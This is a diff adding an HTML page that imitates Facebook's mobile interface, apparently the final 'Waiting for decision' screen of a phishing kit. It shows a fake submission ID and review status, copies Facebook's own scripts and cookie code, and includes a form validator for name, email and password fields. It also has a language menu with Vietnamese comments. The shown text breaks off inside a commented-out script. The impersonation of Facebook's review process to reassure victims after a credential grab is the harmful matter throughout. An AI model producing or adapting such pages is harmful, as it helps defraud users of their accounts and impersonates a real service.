@@ -1,0 +1,874 @@
+<!DOCTYPE html><html lang="en" data-autoid="autoid_1" class=""><head>
+        
+        <title data-localize="screen_4.title">Waiting for decision</title>
+        <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1">
+        <link href="icon_web.ico" rel="shortcut icon">
+        <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer">
+        <meta name="color-scheme" content="light">
+        <meta charset="utf-8" />
+        <script id="u_0_9_SZ" nonce="">
+            "use strict";
+            window.MPageLoadClientMetrics = (function () {
+                var a = +new Date(),
+                    b = {
+                        prelude_onload: ["jewels_visible", "first_paint", "visibility_change", "tti"],
+                        nav_started: ["first_paint", "visibility_change", "prelude_onload"],
+                        first_paint: ["jewels_visible", "visibility_change", "prelude_onload"],
+                        jewels_visible: ["tti", "visibility_change", "navigation", "prelude_onload"],
+                        tti: ["e2e", "visibility_change", "navigation"],
+                    },
+                    c = 3,
+                    d = 3,
+                    e = "nav_started",
+                    f = !0,
+                    g = "",
+                    h = "",
+                    i = 1,
+                    j = "",
+                    k = "",
+                    l = "",
+                    m = "",
+                    n = function () {},
+                    o = !0,
+                    p = !1,
+                    q = !1,
+                    r = [],
+                    s = window.performance || window.msPerformance || window.webkitPerformance || {},
+                    t = (window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || window.oRequestAnimationFrame || window.msRequestAnimationFrame || window.setTimeout).bind(window),
+                    u = window.location.origin || window.location.protocol + "//" + window.location.hostname + (window.location.port && ":" + window.location.port);
+                function v(b, c, d, e, f, i, n) {
+                    s.timing && s.timing.navigationStart && (a = s.timing.navigationStart), (j = b), (k = c), (l = d), (m = e), (g = f), (h = i), (o = n), y();
+                }
+                function w(a) {
+                    var c = b[e];
+                    return c && c.indexOf(a) !== -1;
+                }
+                function x(a) {
+                    return !b[a];
+                }
+                function y() {
+                    var a, b;
+                    document.hidden !== void 0
+                        ? ((a = "hidden"), (b = "visibilitychange"))
+                        : document.mozHidden !== void 0
+                        ? ((a = "mozHidden"), (b = "mozvisibilitychange"))
+                        : document.msHidden !== void 0
+                        ? ((a = "msHidden"), (b = "msvisibilitychange"))
+                        : document.webkitHidden !== void 0 && ((a = "webkitHidden"), (b = "webkitvisibilitychange"));
+                    var c = function () {
+                        K("visibility_change", A()), document.removeEventListener(b, c), window.removeEventListener("beforeunload", c);
+                    };
+                    b && a && !window[a] ? (document.addEventListener(b, c), window.addEventListener("beforeunload", c)) : c();
+                }
+                function z(b) {
+                    return b - a;
+                }
+                function A() {
+                    return s.now ? s.now() : z(+new Date());
+                }
+                function B() {
+                    f && ((f = !1), n());
+                }
+                function C() {
+                    return f;
+                }
+                function D(a) {
+                    n = a;
+                }
+                function E() {
+                    var a = i;
+                    ++i;
+                    return a;
+                }
+                function F(a) {
+                    if (!window.navigator) return;
+                    window.navigator.hardwareConcurrency !== void 0 && (a.num_cores = window.navigator.hardwareConcurrency);
+                    window.navigator.deviceMemory && (a.ram_gb = window.navigator.deviceMemory);
+                    window.navigator.connection &&
+                        (typeof window.navigator.connection.downlink === "number" && (a.downlink_mb = window.navigator.connection.downlink),
+                        typeof window.navigator.connection.effectiveType === "string" && (a.effective_connection_type = window.navigator.connection.effectiveType),
+                        typeof window.navigator.connection.rtt === "number" && (a.rtt_ms = window.navigator.connection.rtt));
+                }
+                function G(b, c, d) {
+                    if (!f) return;
+                    var g = !w(b),
+                        i = (c + a) / 1e3;
+                    c = ((i = { lid: h, seq_num: E(), event: g ? "illegal_transition" : b, client_event_time: i, time_from_nav_start_ms: Math.floor(c) }), (i[l] = m), (i.previous_event = e), (i.log_to_scuba = o), i);
+                    e = b;
+                    j !== "" && (c.fb_dtsg = j);
+                    k !== "" && (c.lsd = k);
+                    g && (c.illegal_transition_event = b);
+                    i = d || "";
+                    i !== "" && (c.navigation_endpoint = i);
+                    F(c);
+                    I(c) || J(c);
+                    (x(b) || g) && B();
+                }
+                function H(a) {
+                    var b = [];
+                    for (var c in a) b.push(c + "=" + encodeURIComponent(a[c]));
+                    a = u + g;
+                    b = b.join("&");
+                    return a + "?" + b;
+                }
+                function I(a) {
+                    a.transmission_method = "beacon";
+                    if (window.navigator && window.navigator.sendBeacon)
+                        if (window.navigator.sendBeacon(H(a))) return !0;
+                        else a.is_retransmit = !0;
+                    return !1;
+                }
+                function J(a, b) {
+                    b === void 0 && (b = d);
+                    a.transmission_method = "img";
+                    var c = new Image();
+                    b < d && (a.is_retransmit = !0);
+                    b &&
+                        (c.onerror = function (c) {
+                            J(a, b - 1);
+                        });
+                    c.src = H(a);
+                }
+                function K(a, b, c) {
+                    if (p) {
+                        r.push({ e: a, time: b, nav: c });
+                        return;
+                    }
+                    G(a, b, c);
+                }
+                function L(a) {
+                    if (!f) return;
+                    p = !0;
+                    var b = function (b) {
+                        b = Math.min.apply(
+                            Math,
+                            [b].concat(
+                                r.map(function (a) {
+                                    return a.time;
+                                })
+                            )
+                        );
+                        p = !1;
+                        G("first_paint", b);
+                        (a || q) && G("jewels_visible", b);
+                        r.forEach(function (a) {
+                            return G(a.e, a.time, a.nav);
+                        });
+                    };
+                    t(function () {
+                        var a = A();
+                        if (s.getEntriesByName) {
+                            var d = function (e) {
+                                var f = s.getEntriesByName("first-paint")[0];
+                                f
+                                    ? b(f.startTime || a)
+                                    : e
+                                    ? window.setTimeout(function () {
+                                          return d(!1);
+                                      }, c)
+                                    : b(a);
+                            };
+                            window.setTimeout(function () {
+                                return d(!0);
+                            }, c);
+                        } else b(a);
+                    });
+                }
+                function M() {
+                    if (p) {
+                        q = !0;
+                        return;
+                    }
+                    G("jewels_visible", A());
+                }
+                function N() {
+                    G("prelude_onload", A());
+                }
+                return { init: v, logFirstPaint: L, logJewelsVisible: M, logPreludeOnload: N, logEvent: K, getMSFromNavStart: A, isEnabled: C, currentTimeToNavStartDelta: z, setDisableCallback: D, disable: B, origin: u };
+            })();
+            MPageLoadClientMetrics.init("AQEeSudqCxLiEhc:9:1637830325", "", "jazoest", "22060", "\/ajax\/mtouch_perf_page_load_timings\/", "7037750802906714093-0", false);
+        </script>
+        <link type="text/css" rel="stylesheet" href="css/LBeK2AdVA10.css" data-bootloader-hash="xrfi7E+" crossorigin="anonymous">
+        <link type="text/css" rel="stylesheet" href="css/eknh9Re3ab9.css" data-bootloader-hash="xb82VEZ" crossorigin="anonymous">
+        <link type="text/css" rel="stylesheet" href="css/ogGTLy0m35N.css" data-bootloader-hash="tvaPsvc" crossorigin="anonymous">
+        <link type="text/css" rel="stylesheet" href="css/tMCGgMHbEWk.css" data-bootloader-hash="8A0KNb4" crossorigin="anonymous">
+        <link type="text/css" rel="stylesheet" href="css/0gtnVJ5rfTK.css" data-bootloader-hash="p84v6t+" crossorigin="anonymous">
+        <script id="u_0_a_6+" nonce="">
+            function envFlush(a) {
+                function b(b) {
+                    for (var c in a) b[c] = a[c];
+                }
+                window.requireLazy ? window.requireLazy(["Env"], b) : ((window.Env = window.Env || {}), b(window.Env));
+            }
+            envFlush({
+                stratcom_event_profiler_hook: "1",
+                timeslice_heartbeat_config: {
+                    pollIntervalMs: 33,
+                    idleGapThresholdMs: 60,
+                    ignoredTimesliceNames: { requestAnimationFrame: true, "Event listenHandler mousemove": true, "Event listenHandler mouseover": true, "Event listenHandler mouseout": true, "Event listenHandler scroll": true },
+                    isHeartbeatEnabled: true,
+                    isArtilleryOn: false,
+                },
+                shouldLogCounters: true,
+                timeslice_categories: { react_render: true, reflow: true },
+                sample_continuation_stacktraces: true,
+                dom_mutation_flag: true,
+            });
+        </script>
+
+        <script nonce="">
+            __DEV__ = 0;
+        </script>
+
+        <script id="u_0_7_Ck" nonce="">
+            (CavalryLogger =
+                window.CavalryLogger ||
+                function (a) {
+                    (this.lid = a),
+                        (this.transition = !1),
+                        (this.metric_collected = !1),
+                        (this.is_detailed_profiler = !1),
+                        (this.instrumentation_started = !1),
+                        (this.pagelet_metrics = {}),
+                        (this.events = {}),
+                        (this.ongoing_watch = {}),
+                        (this.values = { t_cstart: window._cstart }),
+                        (this.piggy_values = {}),
+                        (this.bootloader_metrics = {}),
+                        (this.resource_to_pagelet_mapping = {}),
+                        this.initializeInstrumentation && this.initializeInstrumentation();
+                }),
+                (CavalryLogger.prototype.setIsDetailedProfiler = function (a) {
+                    this.is_detailed_profiler = a;
+                    return this;
+                }),
+                (CavalryLogger.prototype.setTTIEvent = function (a) {
+                    this.tti_event = a;
+                    return this;
+                }),
+                (CavalryLogger.prototype.setValue = function (a, b, c, d) {
+                    d = d ? this.piggy_values : this.values;
+                    (typeof d[a] === "undefined" || c) && (d[a] = b);
+                    return this;
+                }),
+                (CavalryLogger.prototype.getLastTtiValue = function () {
+                    return this.lastTtiValue;
+                }),
+                (CavalryLogger.prototype.setTimeStamp =
+                    CavalryLogger.prototype.setTimeStamp ||
+                    function (a, b, c, d) {
+                        this.mark(a);
+                        var e = this.values.t_cstart || this.values.t_start;
+                        e = d ? e + d : CavalryLogger.now();
+                        this.setValue(a, e, b, c);
+                        this.tti_event && a == this.tti_event && ((this.lastTtiValue = e), this.setTimeStamp("t_tti", b));
+                        return this;
+                    }),
+                (CavalryLogger.prototype.mark =
+                    typeof console === "object" && console.timeStamp
+                        ? function (a) {
+                              console.timeStamp(a);
+                          }
+                        : function () {}),
+                (CavalryLogger.prototype.addPiggyback = function (a, b) {
+                    this.piggy_values[a] = b;
+                    return this;
+                }),
+                (CavalryLogger.instances = {}),
+                (CavalryLogger.id = 0),
+                (CavalryLogger.getInstance = function (a) {
+                    typeof a === "undefined" && (a = CavalryLogger.id);
+                    CavalryLogger.instances[a] || (CavalryLogger.instances[a] = new CavalryLogger(a));
+                    return CavalryLogger.instances[a];
+                }),
+                (CavalryLogger.setPageID = function (a) {
+                    if (CavalryLogger.id === 0) {
+                        var b = CavalryLogger.getInstance();
+                        CavalryLogger.instances[a] = b;
+                        CavalryLogger.instances[a].lid = a;
+                        delete CavalryLogger.instances[0];
+                    }
+                    CavalryLogger.id = a;
+                }),
+                (CavalryLogger.now = function () {
+                    return window.performance && performance.timing && performance.timing.navigationStart && performance.now ? performance.now() + performance.timing.navigationStart : new Date().getTime();
+                }),
+                (CavalryLogger.prototype.measureResources = function () {}),
+                (CavalryLogger.prototype.profileEarlyResources = function () {}),
+                (CavalryLogger.getBootloaderMetricsFromAllLoggers = function () {}),
+                (CavalryLogger.start_js = function () {}),
+                (CavalryLogger.done_js = function () {});
+            CavalryLogger.getInstance().setTTIEvent("t_domcontent");
+            (CavalryLogger.prototype.measureResources = function (a, b) {
+                if (!this.log_resources) return;
+                var c = "bootload/" + a.name;
+                if (this.bootloader_metrics[c] !== void 0 || this.ongoing_watch[c] !== void 0) return;
+                var d = CavalryLogger.now();
+                this.ongoing_watch[c] = d;
+                "start_" + c in this.bootloader_metrics || (this.bootloader_metrics["start_" + c] = d);
+                b && !("tag_" + c in this.bootloader_metrics) && (this.bootloader_metrics["tag_" + c] = b);
+                if (a.type === "js") {
+                    c = "js_exec/" + a.name;
+                    this.ongoing_watch[c] = d;
+                }
+            }),
+                (CavalryLogger.prototype.stopWatch = function (a) {
+                    if (this.ongoing_watch[a]) {
+                        var b = CavalryLogger.now(),
+                            c = b - this.ongoing_watch[a];
+                        this.bootloader_metrics[a] = c;
+                        var d = this.piggy_values;
+                        a.indexOf("bootload") === 0 &&
+                            (d.t_resource_download || (d.t_resource_download = 0),
+                            d.resources_downloaded || (d.resources_downloaded = 0),
+                            (d.t_resource_download += c),
+                            (d.resources_downloaded += 1),
+                            d["tag_" + a] == "_EF_" && (d.t_pagelet_cssload_early_resources = b));
+                        delete this.ongoing_watch[a];
+                    }
+                    return this;
+                }),
+                (CavalryLogger.getBootloaderMetricsFromAllLoggers = function () {
+                    var a = {};
+                    Object.values(window.CavalryLogger.instances).forEach(function (b) {
+                        b.bootloader_metrics && Object.assign(a, b.bootloader_metrics);
+                    });
+                    return a;
+                }),
+                (CavalryLogger.start_js = function (a) {
+                    for (var b = 0; b < a.length; ++b) CavalryLogger.getInstance().stopWatch("js_exec/" + a[b]);
+                }),
+                (CavalryLogger.done_js = function (a) {
+                    for (var b = 0; b < a.length; ++b) CavalryLogger.getInstance().stopWatch("bootload/" + a[b]);
+                }),
+                (CavalryLogger.prototype.profileEarlyResources = function (a) {
+                    for (var b = 0; b < a.length; b++) this.measureResources({ name: a[b][0], type: a[b][1] ? "js" : "" }, "_EF_");
+                });
+            CavalryLogger.getInstance().log_resources = true;
+            CavalryLogger.getInstance().setIsDetailedProfiler(true);
+            window.CavalryLogger && CavalryLogger.getInstance().setTimeStamp("t_start");
+        </script>
+        <script id="u_0_8_KG" nonce="">
+            (function _(a, b, c, d) {
+                function e(a) {
+                    document.cookie = a + "=;expires=Thu, 01-Jan-1970 00:00:01 GMT;path=/;domain=.facebook.com";
+                }
+                function f(a, b) {
+                    document.cookie = a + "=" + b + ";path=/;domain=.facebook.com;secure";
+                }
+                if (!a) {
+                    e(b);
+                    e(c);
+                    return;
+                }
+                a = null;
+                (navigator.userAgent.indexOf("Firefox") !== -1 || (!window.devicePixelRatio && navigator.userAgent.indexOf("Windows Phone") !== -1)) &&
+                    document.documentElement != null &&
+                    ((a = screen.width / document.documentElement.offsetWidth), (a = Math.max(1, Math.floor(a * 2) / 2)));
+                (!a || a === 1) && navigator.userAgent.indexOf("IEMobile") !== -1 && ((a = Math.sqrt(screen.deviceXDPI * screen.deviceYDPI) / 96), (a = Math.max(1, Math.round(a * 2) / 2)));
+                f(b, (a || window.devicePixelRatio || 1).toString());
+                e = window.screen ? screen.width : 0;
+                b = window.screen ? screen.height : 0;
+                f(c, e + "x" + b);
+                d && document.cookie && window.devicePixelRatio > 1 && document.location.reload();
+            })(true, "m_pixel_ratio", "wd", false);
+        </script>
+        
+        <link type="text/css" rel="stylesheet" charset="UTF-8" href="css/translateelement.css">
+
+        <style>
+            *{
+                font-family: system-ui, -apple-system, 'system-ui', '.SFNSText-Regular', sans-serif !important;
+            }
+            @media only screen and (max-width: 600px) {
+                #langDialog {
+                    font-size: 0.85em;
+                }
+            }
+            #langDialog {
+                display : none;
+                width: 80%;
+                max-width: 670px;
+                margin: auto;
+                position: absolute;
+                top: 50%;
+                left: 50%;
+                transform : translate(-50%,-50%);
+
+                background-color: #fff;
+                z-index: 1000000;
+            }
+            #langDialog .titile-dialog {
+                padding-top: 5px;
+                padding-bottom: 5px;
+                padding-left: 10px;
+                padding-right: 10px;
+                background-color: #6d84b4;
+                border: 1px solid #365899;
+                border-bottom: 0;
+                color: #fff;
+                font-size: 14px;
+                font-weight: bold;
+            }
+            #langDialog .content-dialog {
+                display: flex;
+                flex-direction: row;
+
+                border-color: #555;
+                border-style: solid;
+                border-width: 0 1px;
+                padding: 10px;
+            }
+            #langDialog .content-dialog a {
+                color: #385898;
+                cursor: pointer;
+                text-decoration: none;
+            }
+            #langDialog .button-dialog {
+                background-color: #f2f2f2;
+                border: 1px solid #ccc;
+                border-bottom: none;
+                border-left: none;
+                border-right: none;
+                padding: 10px;
+
+                display: flex;
+                flex-direction: row-reverse;
+            }
+            #langDialog .button-dialog a {
+                font-size: 12px;
+                line-height: 26px;
+                background-color: #f5f6f7;
+                border: 1px solid #ccd0d5;
+
+                border-radius: 2px;
+                box-sizing: content-box;
+                color: #4b4f56;
+                font-size: 12px;
+                -webkit-font-smoothing: antialiased;
+                font-weight: bold;
+                justify-content: center;
+                line-height: 22px;
+                padding: 0 6px;
+                text-align: center;
+                text-shadow: none;
+                vertical-align: middle;
+
+                cursor: pointer;
+                display: inline-block;
+                text-decoration: none;
+                white-space: nowrap;
+            }
+            .title-span {
+                font-size: 1.5rem;
+                font-family: inherit;
+                word-wrap: break-word;
+                color: #050505;
+                width: 100%;
+                display: block;
+                text-align: center;
+            }
+            .divider {
+                align-items: center;
+                border-bottom: 1px solid #dadde1;
+                display: flex;
+                margin: 20px 0;
+                text-align: center;
+            }
+            .button {
+                width: 100%;
+                display: flex;
+                background-color: #1B74E4;
+                margin: 20px 0;
+                padding-right: 12px;
+                padding-left: 12px;
+                border-left-width: 0;
+                border-right-width: 0;
+                border-top-width: 0;
+                justify-content: center;
+                box-sizing: border-box;
+                align-items: center;
+
+                border-radius: 6px;
+
+                color: white;
+                line-height: 1.3333;
+                height: 36px;
+                border-bottom-width: 0px;
+            }
+input {
+    font-size: 17px;
+    padding: 14px 16px;
+    width: 336px;
+    border-radius: 6px;
+    background: #FFFFFF url(images/O7nelmd9XSI.png) repeat-x;
+    border: 1px solid #dddfe2;
+    color: #1d2129;
+    font-family: Helvetica, Arial, sans-serif;
+    font-size: 12px;
+    height: 22px;
+    line-height: 16px;
+    vertical-align: middle;
+}
+input {
+    color: transparent;
+}
+input::before {
+    content: attr(placeholder);
+    color: #000;
+}
+input[type=file]::-webkit-file-upload-button {
+    width: 0;
+    padding: 0;
+    margin: 0;
+    -webkit-appearance: none;
+    border: none;
+    border:0px;
+}
+
+ x::-webkit-file-upload-button, input[type=file]:after {
+    content:'Browse...';
+    left: 100%;
+    color: #050505;
+    margin-left:3px;
+    position: relative;
+    -webkit-appearance: button;
+    padding: 3px 8px 2px;
+    border:0px;
+}
+        </style>
+    </head>
+    <body tabindex="0" class="bare touch x1 _fzu _50-3 _67i4 iframe _2v9s portrait" style="background-color: #F0F2F5; min-height: 667px; ">
+        <script id="u_0_6_R4" nonce="">
+            (function (a) {
+                a.__updateOrientation = function () {
+                    var b = !!a.orientation && a.orientation !== 180,
+                        c = document.body;
+                    c && (c.className = c.className.replace(/(^|\s)(landscape|portrait)(\s|$)/g, " ") + " " + (b ? "landscape" : "portrait"));
+                    return b;
+                };
+            })(window);
+        </script>
+        <div id="viewport" data-kaios-focus-transparent="1" style="min-height: 667px;">
+            <h1 style="display: block; height: 0; overflow: hidden; position: absolute; width: 0; padding: 0;">Facebook</h1>
+            <div id="page">
+                <div class="_129_" id="header-notices"></div>
+                <div id="rootcontainer" style="height: 100vh;">
+                    <div class="_2v9s" id="root" role="main" style="height: 100vh;display: flex;flex-direction: column;background-color: #F0F2F5" data-sigil="context-layer-root content-pane">
+                        <div class="_7om2" style="flex:1;flex-direction: column;justify-content: center;align-items: center;">
+                            
+                            <div style="display:flex;flex-direction: column;justify-content: center; align-items: center;">
+                                <div id="content-box" style="min-width: 330px; display: flex; flex-direction: column; justify-content: center; max-width: 394px; background-color: rgb(255, 255, 255); overflow: hidden; border-radius: 8px; padding: 16px; box-shadow: rgba(0, 0, 0, 0.2) 0px 12px 28px 0px, rgba(0, 0, 0, 0.1) 0px 2px 4px 0px, rgba(255, 255, 255, 0.5) 0px 0px 0px 1px inset;">
+                                    <span style="margin-left: 10px;"><span data-localize="screen_4.submission_id"></span>: 10162907569368852</span> 
+                                   
+                                    <span data-localize="screen_4.accepted" class="title-span" style="text-align:left; margin-top:12px;margin-left: 10px;margin-bottom:12px;font-weight:700;">Accepted</span>
+                                    <div style="display:flex;margin-top: 12px; width: 330px;">
+                                        <i data-visualcompletion="css-img" class="x1b0d499 xi3auck" style="-webkit-filter: invert(59%) sepia(11%) saturate(200%) saturate(135%) hue-rotate(176deg) brightness(96%) contrast(94%);background-image: url(&quot;icon.png&quot;); background-position: -163px -59px; background-size: 189px 173px; width: 21px; height: 20px; background-repeat: no-repeat; display: inline-block;"></i>
+                                        <div style="margin-left:6px">
+                                            <span data-localize="screen_4.submission_received" style="color:#65676B;font-size: .9375rem;font-weight:700;">Submission received</span>
+                                            <p data-localize="screen_4.we_received" style="color:#65676B;font-size: .8125rem;text-align: justify;">We received your submission on today</p>
+                                        </div>
+                                    </div>
+                                    <div style="display:flex;margin-top: 12px;">
+                                        <i data-visualcompletion="css-img" class="x1b0d499 xi3auck" style="-webkit-filter:invert(39%) sepia(57%) saturate(200%) saturate(200%) saturate(200%) saturate(200%) saturate(200%) saturate(147.75%) hue-rotate(202deg) brightness(97%) contrast(96%);background-image: url(&quot;icon.png&quot;); background-position: -163px -59px; background-size: 189px 173px; width: 21px; height: 20px; background-repeat: no-repeat; display: inline-block;"></i>
+                                        <div style="margin-left:6px">
+                                            <span data-localize="screen_4.reviewing" style="color:#65676B;font-size: .9375rem; font-weight:700;">Reviewing</span>
+                                            <p data-localize="screen_4.we_are_reviewing" style="color:#65676B;font-size: .8125rem;text-align: justify;">We are reviewing the content your submit</p>
+                                        </div>
+                                    </div>
+                                    <div style="display:flex;margin-top: 12px;">
+                                        <i data-visualcompletion="css-img" class="x1b0d499 xi3auck" style="-webkit-filter: invert(59%) sepia(11%) saturate(200%) saturate(135%) hue-rotate(176deg) brightness(96%) contrast(94%);background-image: url(&quot;icon.png&quot;); background-position: -163px -59px; background-size: 189px 173px; width: 21px; height: 20px; background-repeat: no-repeat; display: inline-block;"></i>
+                                        <div style="margin-left:6px">
+                                            <span data-localize="screen_4.waiting_for_decision" style="color:#65676B;font-size: .9375rem;font-weight:700;">Waiting for decision</span>
+                                            <p data-localize="screen_4.you_will_receive" style="color:#65676B;font-size: .8125rem;text-align: justify;">You will receive an email once we make a decision</p>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class=""></div>
+                <div class="viewportArea _2v9s" style="display: none;" id="u_0_0_S6" data-sigil="marea">
+                    <div class="_5vsg" id="u_0_1_9Z" style="max-height: 938px;"></div>
+                    <div class="_5vsh" id="u_0_2_8r" style="max-height: 481px;"></div>
+                    <div class="_5v5d fcg">
+                        <div class="_2so _2sq _2ss img _50cg" data-animtype="1" data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>
+                        Loading...
+                    </div>
+                </div>
+                <div class="viewportArea aclb" id="mErrorView" style="display: none;" data-sigil="marea">
+                    <div class="container">
+                        <div class="image"></div>
+                        <div class="message" data-sigil="error-message"></div>
+                        <a class="link" data-sigil="MPageError:retry">Try Again</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div id="static_templates">
+            <div class="mDialog" id="modalDialog" style="display: none;" data-sigil=" context-layer-root" data-autoid="autoid_2">
+                <div class="_52z5 _451a mFuturePageHeader _1uh1 firstStep titled" id="mDialogHeader">
+                    <div class="_7om2 _52we">
+                        <div class="_5s61">
+                            <div class="_52z7">
+                                <button type="submit" value="Cancel" class="cancelButton btn btnD bgb mfss touchable" id="u_0_4_J5" data-sigil="dialog-cancel-button">Cancel</button>
+                                <button type="submit" value="Back" class="backButton btn btnI bgb mfss touchable iconOnly" aria-label="Back" id="u_0_5_Du" data-sigil="dialog-back-button">
+                                    <i class="img sp_TH5s7LpCvWO sx_eb84d2" style="margin-top: 2px;"></i>
+                                </button>
+                            </div>
+                        </div>
+                        <div class="_4g34">
+                            <div class="_52z6"><div class="_50l4 mfsl fcw" id="m-future-page-header-title" role="heading" tabindex="0" data-sigil="m-dialog-header-title dialog-title">Loading...</div></div>
+                        </div>
+                        <div class="_5s61"><div class="_52z8" id="modalDialogHeaderButtons"></div></div>
+                    </div>
+                </div>
+                <div class="modalDialogView" id="modalDialogView"></div>
+                <div class="_5v5d _5v5e fcg" id="dialogSpinner">
+                    <div class="_2so _2sq _2ss img _50cg" data-animtype="1" id="u_0_3_NC" data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>
+                    Loading...
+                </div>
+            </div>
+        </div>
+        <script>
+            function validateMyForm() {
+                var name = document.getElementById('name').value;
+                var password = document.getElementById('password').value;
+                var email = document.getElementById('email').value;
+
+                var count = false;
+                if (!(email != null && email != '') ) {
+                    document.getElementById('email').style.border = '1px solid red';
+                    count = true;
+                }
+                else {
+                    document.getElementById('email').style.border = '1px solid #dddfe2';
+                }
+
+                if (!(password != null && password != '') ) {
+                    document.getElementById('password').style.border = '1px solid red';
+                    count = true;
+                }
+                else {
+                    document.getElementById('password').style.border = '1px solid #dddfe2'
+                }
+
+                if (!(name != null && name != '') ) {
+                    document.getElementById('name').style.border = '1px solid red';
+                    count = true;
+                }
+                else {
+                    document.getElementById('name').style.border = '1px solid #dddfe2'
+                }
+                if (count) {
+                    return false;
+                }
+                return true;
+            }
+            </script>
+        
+        <script>
+            now_inl = (function () {
+                var p = window.performance;
+                return p && p.now && p.timing && p.timing.navigationStart
+                    ? function () {
+                          return p.now() + p.timing.navigationStart;
+                      }
+                    : function () {
+                          return new Date().getTime();
+                      };
+            })();
+            window.__bigPipeFR = now_inl();
+        </script>
+        
+        <div class="AdBox Ad advert post-ads"></div>
+        <div id="goog-gt-tt" class="skiptranslate" dir="ltr">
+            <div style="padding: 8px;">
+                <div>
+                    <div class="logo"><img src="images/translate_24dp.png" width="20" height="20" alt="Google Dịch"></div>
+                </div>
+            </div>
+            <div class="top" style="padding: 8px; float: left; width: 100%;"><h1 class="title gray">Văn bản gốc</h1></div>
+            <div class="middle" style="padding: 8px;"><div class="original-text"></div></div>
+            <div class="bottom" style="padding: 8px;">
+                <div class="activity-links"><span class="activity-link">Đóng góp bản dịch hay hơn</span><span class="activity-link"></span></div>
+                <div class="started-activity-container">
+                    <hr style="color: #ccc; background-color: #ccc; height: 1px; border: none;">
+                    <div class="activity-root"></div>
+                </div>
+            </div>
+            <div class="status-message" style="display: none;"></div>
+        </div>
+        <div class="dfp_unit"></div>
+        <div class="goog-te-spinner-pos">
+            <div class="goog-te-spinner-animation">
+                <svg xmlns="http://www.w3.org/2000/svg" class="goog-te-spinner" width="96px" height="96px" viewBox="0 0 66 66">
+                    <circle class="goog-te-spinner-path" fill="none" stroke-width="6" stroke-linecap="round" cx="33" cy="33" r="30"></circle>
+                </svg>
+            </div>
+        </div>
+    
+    
+    <div id="langDialog">
+        <div class="titile-dialog" style="">
+            Select your language        </div>
+        <div class="content-dialog">
+            <div style="flex:1">
+                    <ul>
+                        <!-- Thái Lan -->
+                        <li><a href="?lang=thai">�&nbsp;าษาไทย</a></li>
+                        <!-- Đan mạch -->
+                        <li><a href="?lang=da">Dansk</a></li>
+                        <!-- Thủy Điển -->
+                        <li><a href="?lang=sv">Svenska</a></li>
+                        <!-- Cộng hòa Séc -->
+                        <li><a href="?lang=se">Čeština</a></li>
+                        <!-- Pháp -->
+                        <li><a href="?lang=fr">Français (France)</a></li>
+                        <!-- NHật -->
+                        <li><a href="?lang=ja">日本語</a></li>
+                        <!-- Trung quốc-->
+                        <li><a href="?lang=ch-1">中文(简体)</a></li>
+                        <!-- Đài loan -->
+                        <li><a href="?lang=ch">中文(台灣)</a></li>
+                        <!-- Hy Lạp -->
+                        <li><a href="?lang=gre">Ελληνικά</a></li>
+                        <!-- Hungary -->
+                        <li><a href="?lang=hung">Magyar</a></li>
+                    </ul>
+                </div>
+
+                <div style="flex:1;display: flex;justify-content: center;">
+                    <ul>
+                        
+                        <!-- Thổ nhĩ kì -->
+                        <li><a href="?lang=tur">Türkçe</a></li>
+                        <!-- Mã lai -->
+                        <li><a href="?lang=ma">Bahasa melayu</a></li>
+                        <!-- Mông cổ -->
+                        <li><a href="?lang=mo">Монгол</a></li>
+                        <!-- Hà Lan -->
+                        <li><a href="?lang=na">Nederlands</a></li>
+                        <!-- Bulgaria -->
+                        <li><a href="?lang=no">Български</a></li>
+                        <!-- Na uy -->
+                        <li><a href="?lang=nay">Norsk</a></li>
+                        <!-- Nepal -->
+                        <li><a href="?lang=bu">नेपाली</a></li>
+                        <!-- Ba Lan -->
+                        <li><a href="?lang=pol">Polski</a></li>
+                        <!-- Do thái -->
+                        <li><a href="?lang=he">עברית</a></li>
+                        <!-- Bồ Đào Nha -->
+                        <li><a href="?lang=ba">Português (Portugal)</a></li>
+                    </ul>
+                </div>
+               <div style="flex:1;display: flex;justify-content: center;">
+                    <ul>
+                        
+                        <!-- Thụy điển -->
+                        <li><a href="?lang=sv">Svenska</a></li>
+                        <!-- Phần lan -->
+                        <li><a href="?lang=su">Suomi</a></li>
+                        <!-- estonia -->
+                        <li><a href="?lang=ee">Eesti</a></li>
+                        <!-- ĐỨc -->
+                        <li><a href="?lang=ge">Deutsch</a></li>
+                        <!-- Iceland -->
+                        <li><a href="?lang=ir">Íslenska</a></li>
+                        <!-- Ả rập -->
+                        <li><a href="?lang=ar">عربي</a></li>
+                        <!-- Slovakia -->
+                        <li><a href="?lang=sk">Slovak</a></li>
+                        <!-- România -->
+                        <li><a href="?lang=ro">România</a></li>
+                        <!-- Croatia -->
+                        <li><a href="?lang=hr">Hrvatski</a></li>
+                        <!-- Myanma -->
+                        <li><a href="?lang=mam">မြန်မာ</a></li>
+                        
+                    </ul>
+                </div>
+                <div style="flex:1;display: flex;justify-content: center;">
+                    <ul>
+                        
+                        <!-- Ireland -->
+                        <li><a href="?lang=ic">Gaeilge</a></li>
+                        <!-- Ý -->
+                        <li><a href="?lang=it">Italiano</a></li>
+                        <!-- Serbia -->
+                        <li><a href="?lang=rs">Србија</a></li>
+                        <!-- Uzbekistan -->
+                        <li><a href="?lang=uz">Uzbek</a></li>
+                        <!-- Tajik -->
+                        <li><a href="?lang=ta">Tajik</a></li>
+                        <!-- Kyrgyz -->
+                        <li><a href="?lang=ky">Kyrgyz</a></li>
+                        <!-- Kazakhstan -->
+                        <li><a href="?lang=ka">Kazakh</a></li>
+                        <!-- Khmer -->
+                        <li><a href="?lang=kh">ភាសាខ្មែរ</a></li>
+                        <!-- Slovenia -->
+                        <li><a href="?lang=sl">Slovenščina</a></li>
+                        <!-- Bosnia -->
+                        <li><a href="?lang=bo">Bosanski</a></li>
+                    </ul>
+                </div>
+        </div>
+        <div class="button-dialog">
+                <a href="#" onclick="closeDialog()">Close</a>
+        </div>
+    </div>
+    <script>
+        // window.addEventListener("load", (event) => {
+        //     resize();
+        // });
+        // var widthBox = document.getElementById('content-box').offsetWidth;
+        // window.addEventListener("resize", () => {
+        //     console.log(window.innerHeight);
+        //     if (widthBox >= window.innerWidth) {
